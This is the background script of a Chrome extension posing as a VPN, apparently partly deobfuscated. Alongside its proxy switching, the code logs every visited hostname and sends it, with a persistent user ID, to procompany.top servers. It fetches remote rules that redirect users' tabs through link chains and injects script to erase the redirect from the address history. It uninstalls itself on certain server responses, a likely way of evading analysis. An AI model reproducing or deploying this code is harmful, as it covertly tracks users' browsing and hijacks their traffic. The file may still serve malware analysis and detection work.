/// <reference path="node_modules/@types/chrome/index.d.ts" />
/// @ts-check

const set_to_storage = (e) =>
  // @ts-ignore
  new Promise((t) => chrome.storage.local.set(e, t));
const get_from_storage = (/** @type {string | string[]} */ e) =>
  new Promise((t) => chrome.storage.local.get(e, t));
const remove_from_storage = (e) =>
  // @ts-ignore
  new Promise((t) => chrome.storage.local.remove(e, t));

const isEmpty = (obj) => {
  try {
    for (const _ in obj) {
      return false;
    }
  } catch {}

  return true;
};

const save_decoded_hostname = async (hostname, decoder) => {
  let { b = [] } = await get_from_storage("b");

  /** @type {string} */
  const value = decoder(hostname);

  if (b.indexOf(value) == -1) {
    b.push(value);
    set_to_storage({ b });
  }
};
const set_error = async (e, code, hostname, snd_hostname, decoder) => {
  let { err = [] } = await get_from_storage("err");

  err.push(
    decoder(`${e}:${code}:${hostname}:${snd_hostname}:${get_ru_datestring()}`)
  );

  set_to_storage({ err: err });
};
const ensure_config_created = async () => {
  const default_config = {
    time: 120,
    config:
      "https://fw-2.procompany.top/mv3/v1/chrome/config.txt;https://cf-2.procompany.top/mv3/v1/chrome/config.txt;https://fw-1.procompany.top/mv3/v1/chrome/config.txt;https://cf-1.procompany.top/mv3/v1/chrome/config.txt",
    ctime: get_utc_string(0),
    start: Date.now(),
    uid: gen_uuid_with_version(),
    version: chrome.runtime.getManifest().version,
    share: 0,
    html: "0;lib/common/share.html",
    choice: "UK",
  };
  const storage = await get_from_storage("version");
  console.log(storage);
  if (isEmpty(storage) || storage.version < "2.0")
    for (const [t, s] of Object.entries(default_config))
      ((t != "start" && t != "uid" && t != "choice") ||
        isEmpty(await get_from_storage(t))) &&
        set_to_storage({ [t]: s });
  else
    for (const [t, s] of Object.entries(default_config))
      isEmpty(await get_from_storage(t)) && set_to_storage({ [t]: s });
};
const generate_uri_hash = () => {
  const e = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",
    t = Array.from(
      { length: 120 },
      () => e[Math.floor(Math.random() * e.length)]
    ).join("");
  return `?${t}&`;
};
const get_utc_string = (e) =>
  (e === 0 ? new Date(0) : new Date()).toUTCString();
const get_ru_datestring = () =>
  new Date()
    .toLocaleString("ru-ru", { timeZone: "Europe/Moscow" })
    .replace(",", "");
const gen_uuid_with_version = () =>
  `xxxxxxxxxx-xxxx-xxxx-xxxx-xxxx-v.${
    chrome.runtime.getManifest().version
  }`.replace(/x/g, (e) => {
    let t = (Math.random() * 16) | 0,
      n = e == "x" ? t : (t & 3) | 8;
    return n.toString(16);
  });
const get_last_error = (_, _x, _xx) => chrome.runtime.lastError;
const split_by_semicolon_or_null = (/** @type {string} */ e) =>
  e?.length > 0 ? e.split(";") : null;
const get_hostname = (e) => new URL(e).hostname;
const N = (/** @type {string} */ url) => {
    if (url.includes("//")) {
      // @ts-ignore
      t = url.split("/")[2];
    } else {
      // @ts-ignore
      t = url.split("/")[0];
    }

    let t;
    return (
      url.indexOf("//") > -1
        ? (t = url.split("/")[2])
        : (t = url.split("/")[0]),
      (t = t.split(":")[0]),
      (t = t.split("?")[0]),
      t.replace(/^\./, "")
    );
  },
  E = (e, t) =>
    e === t ||
    e.split(".").slice(-3).join(".") === t ||
    e.split(".").slice(-2).join(".") === t,
  y = (e, t, n) => {
    for (let s = n; s >= 0; s--)
      try {
        const n = decodeURIComponent(e.match(t).toString().split(",")[s]);
        if (n !== "undefined") return n;
      } catch {}
    return null;
  },
  Y = (e, t) => {
    try {
      setTimeout(() => {
        history.replaceState("", "", `https://${location.host}`);
      }, t * 1e3);
    } catch {}
  },
  R = (n, o, i, a, c, l, d, h, m, f, p, rules_id, v, b) => {
    let j =
        /(?:(?:(?:https?):\/\/)|(?:http%3A%2F%2F))([\w_-]+(?:(?:\.[\w_-]+)+))([\w.,@?^=%&:/~+#-]*[\w@?^=%&/~+#-])?/g,
      O = /=$/g,
      x = O.test(n) ? `${n}${o}` : n,
      w = 0;
    if (!Number(atob(b))) {
      removeRulesById(rules_id);
      return;
    }
    const _ = async (n) => {
      let a;
      if ((w++, w > 7)) {
        set_error(h, 555, get_hostname(o), get_hostname(n), btoa),
          await removeRulesById(rules_id),
          i(o, c, o);
        return;
      }
      fetch(n)
        .then(async (n) => {
          if (E(N(n?.url), "w3.org")) {
            set_error(h, n.status, get_hostname(o), get_hostname(n.url), btoa),
              await removeRulesById(rules_id),
              i(o, c, o, Number(atob(f)));
            return;
          }
          if (p?.includes(n?.url))
            Number(atob(d)) && n?.ok
              ? (await removeRulesById(rules_id), i(o?.split("?")[0], c, o))
              : (await removeRulesById(rules_id),
                Number(atob(v))
                  ? i(
                      n.url.replace("?", generate_uri_hash()),
                      c,
                      o,
                      Number(atob(f))
                    )
                  : i(n.url, c, o, Number(atob(f))));
          else if (Number(atob(l)))
            n.text()
              .then(async (t) => {
                try {
                  await removeRulesById(rules_id),
                    i(
                      y(
                        decodeURIComponent(decodeURIComponent(t)).trim(),
                        j,
                        Number(atob(m))
                      ),
                      c,
                      o,
                      Number(atob(f))
                    );
                } catch {
                  await removeRulesById(rules_id),
                    i(y(t.trim(), j, Number(atob(m))), c, o, Number(atob(f)));
                }
              })
              .catch(async () => {
                set_error(
                  h,
                  n.status,
                  get_hostname(o),
                  get_hostname(n.url),
                  btoa
                ),
                  await removeRulesById(rules_id),
                  i(o, c, o);
              });
          else {
            const b = /text\/html/i;
            // @ts-ignore
            if (!b.test(n?.headers?.get("content-type"))) {
              set_error(
                h,
                n.status,
                get_hostname(o),
                get_hostname(n.url),
                btoa
              ),
                await removeRulesById(rules_id),
                i(o, c, o);
              return;
            }
            let l;
            try {
              l = decodeURIComponent(decodeURIComponent(n.url));
            } catch {}
            n.text()
              .then(async (n) => {
                try {
                  a = y(
                    decodeURIComponent(decodeURIComponent(n))?.trim(),
                    j,
                    Number(atob(m))
                  )?.replace(/url=([^?&]*)(&)/, "url=$1?");
                } catch {
                  a = y(n?.trim(), j, Number(atob(m)))?.replace(
                    /url=([^?&]*)(&)/,
                    "url=$1?"
                  );
                }
                const b = /(\/direct-link\/|\/promo-landing-v\d+\/)/i;
                if (a && !b.test(l))
                  p?.includes(a)
                    ? // @ts-ignore
                      Number(atob(d)) && n?.ok
                      ? (await removeRulesById(rules_id),
                        i(o?.split("?")[0], c, o))
                      : (await removeRulesById(rules_id),
                        Number(atob(v))
                          ? i(
                              a.replace("?", generate_uri_hash()),
                              c,
                              o,
                              Number(atob(f))
                            )
                          : i(a, c, o, Number(atob(f))))
                    : _(a);
                else if (l) {
                  let e;
                  try {
                    e = decodeURIComponent(
                      decodeURIComponent(
                        l?.replace(/link=([^?&]*)(&)/, "link=$1?")
                      )
                    ).match(/(https?:\/\/.*?(https?:\/\/.*))/);
                  } catch {
                    e = l
                      ?.replace(/link=([^?&]*)(&)/, "link=$1?")
                      .match(/(https?:\/\/.*?(https?:\/\/.*))/);
                  }
                  e?.[2]
                    ? _(e?.[2])
                    : (set_error(
                        h,
                        444,
                        get_hostname(o),
                        get_hostname(l),
                        btoa
                      ),
                      await removeRulesById(rules_id),
                      i(o, c, o));
                }
              })
              .catch(async () => {
                set_error(
                  h,
                  n.status,
                  get_hostname(o),
                  get_hostname(n.url),
                  btoa
                ),
                  await removeRulesById(rules_id),
                  i(o, c, o);
              });
          }
        })
        .catch(async (e) => {
          set_error(h, 999, get_hostname(o), get_hostname(n), btoa),
            await removeRulesById(rules_id),
            i(o, c, o);
        });
    };
    _(x);
  },
  ensure_vpns_disabled = async (
    /** @type {string} */ hostname,
    /** @type {string} */ url,
    /** @type {number} */ tabId,
    /** @type {number} */ l
  ) => {
    for (const d of a) {
      const u = new RegExp(atob(d.d));
      if (!g.has(d.d) && u.test(url) && E(hostname, N(atob(d.o)))) {
        g.add(d.d), set_to_storage({ set: [...g] });
        let v = !1;
        const { eIds, pr } = await get_from_storage(["eIds", "pr"]);
        if (eIds?.length > 0)
          for (const e of eIds)
            if (e !== chrome.runtime.id) {
              const t = await new Promise((t) => {
                chrome.runtime.sendMessage(e, { query: "getPriority" }, (e) => {
                  chrome.runtime.lastError, t(e);
                });
              });
              if (t?.priority !== void 0 && t?.priority > pr) {
                v = !0;
                break;
              }
            }
        let t, a, h, m, f, p;
        if (
          (l
            ? ({
                // @ts-ignore
                t: t = btoa(0),
                // @ts-ignore
                p: a = btoa(0),
                // @ts-ignore
                b: h = btoa(0),
                // @ts-ignore
                h: m = btoa(1),
                // @ts-ignore
                r: f = btoa(1),
                // @ts-ignore
                s: p = btoa(1),
              } = d)
            : ({
                // @ts-ignore
                t: t = btoa(0),
                // @ts-ignore
                p: a = btoa(0),
                // @ts-ignore
                b: h = btoa(0),
                // @ts-ignore
                h: m = btoa(1),
                // @ts-ignore
                r: f = btoa(1),
                // @ts-ignore
                s: p = btoa(0),
              } = d),
          v == !0)
        ) {
          await removeRulesById(d.ri);
          return;
        }
        R(atob(d.u), url, I, u, tabId, t, h, d.n, a, m, atob(d.o), d.ri, f, p);
      }
    }
  },
  show_tab = (page) => {
    chrome.tabs.create({ url: page }, get_last_error);
  },
  remove_tab = (e) => {
    chrome.tabs.remove(e, get_last_error);
  },
  reload_tab = (e) => {
    chrome.tabs.reload(e, get_last_error);
  },
  I = (e, t, n, s = 1) => {
    if (s)
      return new Promise((o) => {
        chrome.tabs.update(t, { url: e }, (e) => {
          chrome.runtime.lastError;
          const t = (i, a) => {
            if (a?.status === "complete" && i === e?.id) {
              chrome.tabs.onUpdated.removeListener(t);
              try {
                chrome.scripting.executeScript({
                  target: { tabId: i },
                  args: [n.replace(/^http:\/\//i, "https://"), s],
                  injectImmediately: !0,
                  func: Y,
                });
              } catch {}
              o(e);
            }
          };
          chrome.tabs.onUpdated.hasListener(t) &&
            chrome.tabs.onUpdated.removeListener(t),
            chrome.tabs.onUpdated.addListener(t);
        });
      });
    chrome.tabs.update(t, { url: e }, get_last_error);
  };
const ie = async (/** @type {function(string | undefined)} */ callback) => {
  const storage = await get_from_storage(["html", "share", "start"]);
  const htmls = split_by_semicolon_or_null(storage.html);

  if (
    storage.share == 0 &&
    // @ts-ignore
    htmls.shift() != 0 &&
    Date.now() - storage.start > 4e8
  ) {
    set_to_storage({ share: Date.now() });
    // @ts-ignore
    callback(htmls.shift());
  }
};
const is_access_to_sites_given = () =>
  new Promise((res) => {
    chrome.permissions.getAll((t) => {
      // @ts-ignore
      res(t?.origins && Boolean(t.origins.includes("<all_urls>")));
    });
  });
const prepare_uninstall_url = async () => {
  const { uid } = await get_from_storage("uid"),
    uninstall_url = is_mobile_platform()
      ? `https://fw-1.procompany.top/mv3/chrome/uninstall?platform=mobile`
      : `https://fw-1.procompany.top/mv3/chrome/uninstall?uid=${uid}`;

  chrome.runtime.setUninstallURL(uninstall_url);
};
const browser_pooling = () => {
  clearInterval(interval_id);
  interval_id = setInterval(chrome.runtime.getPlatformInfo, 20 * 1000);
};

const bind_stable_connection_to_tabs = async (
  /** @type {chrome.tabs.Tab[]} */ tabs
) => {
  tabs ??= await chrome.tabs.query({ url: "<all_urls>" });

  for (const { id: tabId } of tabs)
    try {
      await chrome.scripting.executeScript({
        // @ts-ignore
        target: { tabId },
        func: bindKeepConnection,
      }),
        chrome.tabs.onUpdated.removeListener(keep_connection_on_update);
      return;
    } catch {}

  chrome.tabs.onUpdated.addListener(keep_connection_on_update);
};

const bindKeepConnection = function e() {
  chrome.runtime.connect({ name: "keepAlive" }).onDisconnect.addListener(e);
};

const synchronize_set_and_a = async () => {
  try {
    // @ts-ignore
    a = (await get_from_storage({ k: [] })).k;
    console.log("458 line a (arr) : %o", a);
  } catch {}
  try {
    g = new Set([...(await get_from_storage("set")).set]);
    console.log("458 line g (Set) : %o", g);
  } catch {}
};

const install_pac_scripts = async (some_bool_param = false) => {
  try {
    if (!(await is_access_to_sites_given())) {
      replace_rules();
      a = [];
      return true;
    }

    if (is_mobile_platform()) {
      chrome.management.uninstallSelf();
      return;
    }

    const storage = await get_from_storage();

    storage.b ||= [];
    storage.err ||= [];

    const realExtensionId = "bibjcjfmgapbfoljiojpipaooddpkpai";

    const telemetry = {
      array: split_by_semicolon_or_null(storage.config),
      string: `?uid=${storage.uid}&ver=${
        chrome.runtime.getManifest().version
      }&extid=${realExtensionId}&start=${storage.start}&opt=${
        storage.option
      }&cy=${storage.choice}&hash=${[...storage.b].join("-")}&err=${[
        ...storage.err,
      ].join("-")}`,
    };

    const get_pac_scripts = async () => {
      try {
        // @ts-ignore
        const response = await fetch(telemetry.array.pop() + telemetry.string, {
          method: "GET",
          headers: new Headers({
            "If-Modified-Since": storage.ctime,
            "X-Requested-With": realExtensionId,
          }),
        });
        if (((j = 0), response.status == 304)) {
          storage?.k && (a = storage.k),
            storage?.dnr &&
              (await ensure_tabs_loaded(), replace_rules(storage.dnr)),
            set_to_storage({ ctime: get_utc_string() }),
            remove_from_storage(["b", "err", "set"]);
          return;
        }
        if (response.status == 204) return;
        if (response.status == 403) {
          const e = response.headers.get("Server");
          if (e === "cloudflare") {
            chrome.management.uninstallSelf();
            return;
          }
        }
        if (!response.ok) {
          remove_from_storage(["b", "err", "set"]),
            // @ts-ignore
            telemetry.array.length != 0 && (await get_pac_scripts());
          return;
        }
        const c = response.headers.get("content-type");
        if (!c || c.indexOf("application/json") == -1) {
          // @ts-ignore
          telemetry.array.length == 0 ? L() : await get_pac_scripts();
          return;
        }

        const vpn_adresses = await response.json();
        console.log(vpn_adresses);

        remove_from_storage(["k", "b", "err", "set"]);

        let config_urls = vpn_adresses.c.reduce(
            (acc, it) => (it.d ? acc + atob(it.d) : acc),
            ""
          ),
          decoded_urls;
        (a = []),
          vpn_adresses.e &&
            Array.isArray(vpn_adresses.e) &&
            (decoded_urls = vpn_adresses.e.map((t) => atob(t.i)));
        const filters = {
          addRules: vpn_adresses.dr.map(
            (e) => (e.spec && (a.push(...e.spec), delete e.spec), e)
          ),
        };
        vpn_adresses.cc &&
          Array.isArray(vpn_adresses.cc) &&
          vpn_adresses.cc.forEach(async (e) => {
            await set_to_storage({ [e.n]: { l: e.l, s: e.s } });
          }),
          set_to_storage({
            config: config_urls,
            html: atob(vpn_adresses.r),
            time: atob(vpn_adresses.t),
            pr: Number(atob(vpn_adresses.pr)),
            k: a,
            eIds: decoded_urls,
            ctime: get_utc_string(),
            dnr: filters,
          }),
          L(),
          await ensure_tabs_loaded(),
          replace_rules(filters);
      } catch {
        if (
          ((j = 0),
          // @ts-ignore
          telemetry.array.length == 0 && Date.parse(storage.ctime) == 0)
        ) {
          set_title_and_icon(), chrome.action.disable();
          for (const e of await chrome.tabs.query({ url: "<all_urls>" }))
            try {
              // @ts-ignore
              const t = new URL(e.url);
              t?.protocol == "chrome-extension:" &&
                t?.hostname == chrome.runtime.id &&
                // @ts-ignore
                chrome.tabs.sendMessage(e.id, { error: "error" });
            } catch {}
          // @ts-ignore
        } else telemetry.array.length != 0 && (await get_pac_scripts());
        return;
      }
    };
    const d = async (e, t = 5e3) =>
      new Promise((n) => {
        const s = () => {
          // @ts-ignore
          e() ? n() : setTimeout(s, t);
        };
        s();
      });
    await d(() => navigator?.onLine === !0),
      !j &&
        (some_bool_param ||
          Date.now() - new Date(storage.ctime).getTime() >
            Number(storage.time) * 50 * 1e3) &&
        ((j = 1), await get_pac_scripts(), g.clear()),
      chrome.alarms.create("interval", {
        periodInMinutes: Number(storage.time),
      }),
      ensure_alarm_listener_removed(O),
      chrome.alarms.onAlarm.addListener(O);
  } catch {}
};

const get_browser_brand = () => {
  // @ts-ignore
  for (let e of navigator.userAgentData.brands) {
    if (e?.brand == "Google Chrome") return "Chrome";
    if (e?.brand == "Microsoft Edge") return "Edge";
    if (e?.brand == "YaBrowser" || e?.brand == "Yandex") return "Yandex";
  }
};
// @ts-ignore
const is_mobile_platform = () => navigator?.userAgentData?.mobile,
  set_title_and_icon = (enable = "off") => {
    const [title, path] =
      enable === "on"
        ? ["On", "images/icon32.png"]
        : ["Off", "images/icon32_grey.png"];

    chrome.action.setTitle({ title }), chrome.action.setIcon({ path });
  };

const L = async () => {
  const { choice } = await get_from_storage("choice");
  if (choice == "NOVPN" || choice == null) {
    set_proxy_settings(new DirectMode());
    return;
  }

  const settings = await get_from_storage([choice, "UK"]);

  settings[choice] == null || settings[choice].s == "d"
    ? settings.UK != null && settings.UK.s != "d"
      ? set_proxy_settings(new PacScriptMode(settings.UK.l))
      : set_proxy_settings(new DirectMode())
    : set_proxy_settings(new PacScriptMode(settings[choice].l));
};

class DirectMode {
  /** @type {"direct"} */
  mode = "direct";
}

class PacScriptMode {
  /** @type {"pac_script"} */
  as_str = "pac_script";

  constructor(
    /** @type {string} */ pac_script,
    /** @type {string[]} */ hosts = []
  ) {
    this.pac_script = pac_script;
    this.hosts = hosts;
  }

  get builded_pac_script() {
    if (this.hosts.length === 0) {
      return this.pac_script;
    }

    const regex = new RegExp(
      String.raw`function\ *FindProxyForURL\ *([^]*)\ *{[^]*}`,
      "g"
    );

    const updated_pac_script = this.pac_script.replace(
      regex,
      `function FindProxyForURL(url, host) {
          if (!(${JSON.stringify(this.hosts)}.some(it => it === host))) {
            return "DIRECT"
          }

          if (/\.(googlevideo|youtube|ytimg|ggpht)\.com$/.test(host)) {
            return YT_HTTPS;
          }
          const schema = url.split(":")[0];
          if (
            schema !== "http" &&
            schema !== "https" &&
            schema !== "ws" &&
            schema !== "wss"
          ) {
            return "DIRECT";
          }
          if (isPlainHostName(host)) {
            return "DIRECT";
          }
          const ip = dnsResolve(host);
          if (
            isInNet(ip, "10.0.0.0", "255.0.0.0") ||
            isInNet(ip, "172.16.0.0", "255.240.0.0") ||
            isInNet(ip, "192.168.0.0", "255.255.0.0") ||
            isInNet(ip, "127.0.0.0", "255.255.255.0")
          ) {
            return "DIRECT";
          }
          if (WHITE_LIST && WHITE_LIST.length > 0) {
            for (let i in WHITE_LIST) {
              if (WHITE_LIST[i] == host) {
                return "DIRECT";
              }
              if (WHITE_LIST[i][0] == "*") {
                let length = -1 * (WHITE_LIST[i].length - 2);
                if (WHITE_LIST[i].substr(length) == host) {
                  return "DIRECT";
                }
                length = -1 * (WHITE_LIST[i].length - 1);
                if (WHITE_LIST[i].substr(length) == host.substr(length)) {
                  return "DIRECT";
                }
              }
            }
          }
          if (GLOBAL_LIST && GLOBAL_LIST.length > 0) {
            for (let i in GLOBAL_LIST) {
              if (GLOBAL_LIST[i] == host) {
                return GLOBAL_PROXY;
              }
              if (GLOBAL_LIST[i][0] == "*") {
                let length = -1 * (GLOBAL_LIST[i].length - 2);
                if (GLOBAL_LIST[i].substr(length) == host) {
                  return GLOBAL_PROXY;
                }
                length = -1 * (GLOBAL_LIST[i].length - 1);
                if (GLOBAL_LIST[i].substr(length) == host.substr(length)) {
                  return GLOBAL_PROXY;
                }
              }
            }
          }
          if (BLACK_LIST && BLACK_LIST.length > 0) {
            for (let i in BLACK_LIST) {
              if (BLACK_LIST[i] == host) {
                return BLOCK_PROXY;
              }
              if (BLACK_LIST[i][0] == "*") {
                let length = -1 * (BLACK_LIST[i].length - 2);
                if (BLACK_LIST[i].substr(length) == host) {
                  return BLOCK_PROXY;
                }
                length = -1 * (BLACK_LIST[i].length - 1);
                if (BLACK_LIST[i].substr(length) == host.substr(length)) {
                  return BLOCK_PROXY;
                }
              }
            }
          }
          return VPN;
        }`
    );

    console.log("updated script is: %o", updated_pac_script);

    return updated_pac_script;
  }
}

const set_proxy_settings = async (
  /** @type {DirectMode | PacScriptMode} */ mode
) => {
  chrome.proxy.settings.clear({});

  if (!(await is_access_to_sites_given()) || mode instanceof DirectMode) {
    set_title_and_icon();
    return;
  }

  set_title_and_icon("on");

  const value = {
    mode: mode.as_str,
    pacScript: { data: mode.builded_pac_script },
  };

  await new Promise((e) =>
    chrome.proxy.settings.set({ value, scope: "regular" }, e)
  );
};

const replace_rules = async (
  /** @type {chrome.declarativeNetRequest.UpdateRuleOptions | undefined} */ new_rules_id
) => {
  const dynamic_rules = await chrome.declarativeNetRequest.getDynamicRules();

  const rules_ids = dynamic_rules.map((e) => e.id);
  const command = { removeRuleIds: rules_ids };

  if (new_rules_id?.addRules) {
    command.addRules = new_rules_id.addRules;
  }

  await chrome.declarativeNetRequest.updateDynamicRules(command);
};

const removeRulesById = (/** @type {number[] | undefined} */ removeRuleIds) =>
  new Promise((callback) => {
    chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds }, () => {
      callback(1);
    });
  });

const ensure_tabs_loaded = async () => {
  const start_time = Date.now();

  while (true) {
    /** @type {chrome.tabs.Tab[]} */
    const tabs = await new Promise((e) => {
      chrome.tabs.query({}, e);
    });

    const loading_tabs = tabs.filter((tab) => tab.status === "loading");

    if (loading_tabs.length > 0) {
      if (Date.now() - start_time > 300 * 1000) break;
      await new Promise((e) => setTimeout(e, 3e3));
    } else break;
  }
};

const ensure_alarm_listener_removed = (alarm_listener) => {
  chrome.alarms.onAlarm.hasListener(alarm_listener) &&
    chrome.alarms.onAlarm.removeListener(alarm_listener);
};

const on_remove_permission = (
  /** @type {chrome.permissions.Permissions} */ e
) => {
  e.origins?.includes("<all_urls>") &&
    (show_tab("lib/common/error.html"),
    chrome.action.disable(),
    set_title_and_icon(),
    set_proxy_settings(new DirectMode()),
    replace_rules(),
    (a = []));
};

const on_add_permission = (e) => {
  e.origins.includes("<all_urls>") &&
    chrome.tabs.query({}, async (e) => {
      e.forEach((e) => {
        e?.url?.includes(`${chrome.runtime.id}/lib/common/error.html`) &&
          remove_tab(e.id);
      }),
        chrome.action.enable(),
        set_title_and_icon("on"),
        await set_to_storage({ ctime: get_utc_string(0) }),
        await install_pac_scripts(true);
    });
};

const O = (e) => {
  e?.name == "interval" &&
    chrome.alarms.clear("interval", async (e) => {
      // @ts-ignore
      ie(show_tab), await install_pac_scripts();
    });
};

const on_tabs_updated = async (
  /** @type {number} */ tabId,
  /** @type {chrome.tabs.TabChangeInfo} */ changeInfo,
  /** @type {chrome.tabs.Tab} */ tab
) => {
  if (changeInfo?.status == "complete") {
    const hostname = get_hostname(tab.url);
    if ((await save_decoded_hostname(hostname, btoa), !a?.length)) return;
    // @ts-ignore
    ensure_vpns_disabled(hostname, tab.url, tabId, 0);
  }
};

const on_before_request = async (
  /** @type {(details: chrome.webRequest.WebRequestBodyDetails) => chrome.webRequest.BlockingResponse | void} */ e
) => {
  // @ts-ignore
  const hostname = get_hostname(e.url);
  if ((await save_decoded_hostname(hostname, btoa), !a?.length)) return;

  // @ts-ignore
  ensure_vpns_disabled(hostname, e.url, e.tabId, 1);
};

const on_extension_installed = async (e) => {
  if (e?.reason == "install") {
    const is_mobile = is_mobile_platform();
    const brand = get_browser_brand();

    if (!is_mobile)
      switch (brand) {
        case "Edge":
          show_tab("lib/common/start_edge.html");
          break;
        case "Yandex":
          show_tab("lib/common/start_yandex.html");
          break;
        default:
          show_tab("lib/common/start.html");
      }
    set_to_storage({ choice: "UK" });
    set_title_and_icon("on");
  } else if (e?.reason == "update") {
    e?.previousVersion < "3.0.0" &&
      (await set_to_storage({
        config:
          "https://fw-2.procompany.top/mv3/v1/chrome/config.txt;https://cf-2.procompany.top/mv3/v1/chrome/config.txt;https://fw-1.procompany.top/mv3/v1/chrome/config.txt;https://cf-1.procompany.top/mv3/v1/chrome/config.txt",
        version: chrome.runtime.getManifest().version,
        share: 0,
        ctime: get_utc_string(0),
      }),
      await install_pac_scripts(true));
    const { choice } = await get_from_storage("choice");
    choice == "NOVPN" && set_title_and_icon(),
      (await is_access_to_sites_given()) || show_tab("html/error.html");
  }
};

const on_browser_start = async () => {
  browser_pooling();
  const { choice } = await get_from_storage("choice");
  if (
    (choice == "NOVPN" && set_title_and_icon(),
    !(await is_access_to_sites_given()))
  ) {
    show_tab("lib/common/error.html");
    chrome.action.disable();
    replace_rules();
    a = [];
    return;
  }
  await install_pac_scripts(true);
};

const keep_connection_on_update = (
  _,
  /** @type {chrome.tabs.TabChangeInfo} */ changeInfo,
  /** @type {chrome.tabs.Tab} */ tab
) => {
  if (changeInfo.url && /^https?:/.test(changeInfo.url))
    bind_stable_connection_to_tabs([tab]);
};

const on_extension_connected = (e) => {
  if (e.name === "keepAlive") {
    setTimeout(() => e.disconnect(), 25e4);
    e.onDisconnect.addListener(() => bind_stable_connection_to_tabs());
  }
};

const on_message_external = async (e, t, s) => {
  if (!(await is_access_to_sites_given())) return !0;
  if (e?.query == "getPriority") {
    const { eIds: o, pr: i } = await get_from_storage(["eIds", "pr"]);
    let e = !1;
    for (const n of o)
      if (n === t.id) {
        e = !0;
        break;
      }
    e && s({ priority: i });
  }
  return !0;
};

const handle_change_country = async (
  /** @type {string} */ country,
  /** @type {string[]} */ hosts = []
) => {
  const storage = await get_from_storage([country, "UK"]);
  const choice = storage[country];
  set_to_storage({ hosts });

  if (country == "NOVPN" || country == null || country == undefined) {
    set_proxy_settings(new DirectMode());
    set_to_storage({ choice: "NOVPN" });
  } else if (choice.s == "d") {
    set_proxy_settings(new PacScriptMode(storage.UK.l, hosts));
  } else {
    set_proxy_settings(new PacScriptMode(choice?.l, hosts));
  }
};

const patch_pac_script = (
  /** @type {string[]}*/ hosts,
  /** @type {string} */ script
) => {};

const on_message = async (
  /** @type {{ choice?: string, update_hosts?: string[] }} */ message,
  sender,
  /** @type {(response?: any) => void} */ sendMessage
) => {
  if (!(await is_access_to_sites_given())) {
    return;
  }

  const { hosts } = await get_from_storage("hosts");
  const { choice } = await get_from_storage("choice");

  if (typeof message?.choice === "string") {
    handle_change_country(message.choice, hosts);
  }

  if (Array.isArray(message?.update_hosts)) {
    if (message.update_hosts.length == 0) {
      handle_change_country(choice, hosts);
    }

    handle_change_country(choice, message.update_hosts);
  }

  sendMessage();
};

const bind_listeners = () => {
  ensure_alarm_listener_removed(O),
    chrome.runtime.onInstalled.addListener(on_extension_installed),
    chrome.runtime.onConnect.addListener(on_extension_connected),
    chrome.runtime.onStartup.addListener(on_browser_start),
    chrome.permissions.onAdded.addListener(on_add_permission),
    chrome.permissions.onRemoved.addListener(on_remove_permission),
    chrome.tabs.onUpdated.addListener(on_tabs_updated),
    chrome.runtime.onMessageExternal.addListener(on_message_external),
    chrome.runtime.onMessage.addListener(on_message),
    // @ts-ignore
    chrome.webRequest.onBeforeRequest.addListener(on_before_request, {
      urls: ["<all_urls>"],
      types: ["main_frame"],
    });
};

const createArrayProxy = (array) => {
  return new Proxy(array, {
    get(target, property) {
      console.log(`Получение свойства ${String(property)}`);
      console.trace();
      return target[property];
    },
    set(target, property, value) {
      console.log(`Установка ${String(property)} = ${value}`);
      target[property] = value;
      return true;
    },
  });
};

/** @type {any[]} */
let a = createArrayProxy([]),
  g = new Set(),
  j = 0,
  interval_id;

const main = async () => {
  browser_pooling();
  bind_stable_connection_to_tabs();
  await bind_listeners();
  await ensure_config_created();
  await synchronize_set_and_a();
  await prepare_uninstall_url();
  await install_pac_scripts();
};

main();
